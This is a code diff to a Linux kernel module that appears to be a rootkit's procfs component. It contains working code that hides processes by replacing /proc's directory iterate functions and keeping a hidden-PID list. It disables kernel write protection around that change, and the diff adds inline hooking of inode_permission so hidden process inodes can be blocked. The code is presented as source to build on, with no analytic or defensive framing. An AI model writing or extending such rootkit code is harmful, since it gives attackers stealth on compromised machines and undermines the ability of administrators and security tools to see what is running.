@@ -6,10 +6,12 @@
 #include <linux/list.h>
 #include <linux/namei.h>
 #include <linux/kernel.h>
+#include <linux/sched.h>
 
 #include "err.h"
 #include "procfs_ops.h"
 #include "memory_prot.h"
+#include "inline_hooking.h"
 
 #define MAX_PID_LENGTH  8
 
@@ -29,11 +31,14 @@ struct hidden_pid
 /* Hidden pids linked list */
 LIST_HEAD(hidden_pids);
 
+/* original function pointers */
 static filldir_t proc_orig_filldir;
 static getattr_t orig_getattr;
 static int (*orig_open)(struct inode *i, struct file *f);
 static int (*proc_orig_iterate)(struct file *, struct dir_context *);
 static int (*proc_orig_iterate_shared)(struct file *, struct dir_context *);
+
+
 static struct file_operations *proc_orig_fops;
 static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry *dummy;
@@ -41,6 +46,7 @@ static struct file_operations dummy_fops =
 {
 	.owner = THIS_MODULE
 };
+
 
 static struct inode *proc_find_inode(const char *name)
 {
@@ -54,7 +60,6 @@ static struct inode *proc_find_inode(const char *name)
 
 }
 
-
 static bool is_pid_hidden(const char *pid)
 {
 	struct hidden_pid *hpid;
@@ -64,6 +69,18 @@ static bool is_pid_hidden(const char *pid)
 		return false;
 	list_for_each_entry(hpid, &hidden_pids, list) {
 		if (!strncmp(hpid->pid, pid, MAX_PID_LENGTH))
+			return true;
+	}
+	return false;
+}
+
+bool is_inode_hidden(const struct inode *inode)
+{
+	struct hidden_pid *hpid;
+	if (!inode || list_empty(&hidden_pids))
+		return false;
+	list_for_each_entry(hpid, &hidden_pids, list) {
+		if (hpid->inode == inode)
 			return true;
 	}
 	return false;
@@ -196,7 +213,11 @@ static int proc_zl_iterate(struct file *file, struct dir_context *ctx)
 }
 
 
-/* return wether init worked or failed */
+/*
+ * replace /proc/ iterate function to hide pids in hidden_pids list
+ *
+ * return wether init worked or failed
+ */
 bool init_procfs(void)
 {
 	dummy = proc_create("dummy", S_IFREG | S_IRUGO, NULL, &dummy_fops);
@@ -218,6 +239,7 @@ bool init_procfs(void)
 	proc_orig_fops->iterate = proc_zl_iterate;
 	proc_orig_fops->iterate_shared = proc_zl_iterate;
 	enable_wp();
+	hook_inode_permission();
 	return true;
 }
 
@@ -229,4 +251,5 @@ void cleanup_procfs(void)
 	proc_orig_fops->iterate = proc_orig_iterate;
 	proc_orig_fops->iterate_shared = proc_orig_iterate_shared;
 	enable_wp();
+	unhook_inode_permission();
 }
